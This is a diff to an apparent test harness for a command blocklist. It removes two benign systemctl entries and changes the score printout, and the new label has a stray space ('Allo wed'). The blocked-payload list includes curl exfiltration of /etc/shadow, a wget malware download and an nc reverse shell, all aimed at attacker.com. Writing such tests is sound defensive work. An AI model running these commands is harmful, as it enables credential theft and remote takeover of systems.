@@ -45,8 +45,6 @@ BLOCK_PAYLOADS = [
     "curl -X POST -d @/etc/shadow http://attacker.com",
     "wget http://attacker.com/malware.sh",
     "nc -e /bin/bash attacker.com 4444",
-    "systemctl status ssh",
-    "systemctl restart nginx",
     "service cron restart",
     "nano /tmp/test.txt",
     # "top",  # without -b, this hangs forever
@@ -329,7 +327,9 @@ def run_sequential(payloads, is_blocklist=True):
     print(f"Blocked : {blocked}")
     print(f"Allowed : {allowed}")
     print(f"Time    : {end - start:.2f}s")
-    print(f"SCORE   : {allowed / total * 100:.2f}% (Payloads Allowed)")
+    print(
+        f"SCORE   : {allowed / total * 100:.2f}% (Payloads {'Allo wed' if is_blocklist else 'Blocked'})"
+    )
     print(
         f"{GREEN}PASS{RESET}"
         if (is_blocklist and blocked == total)
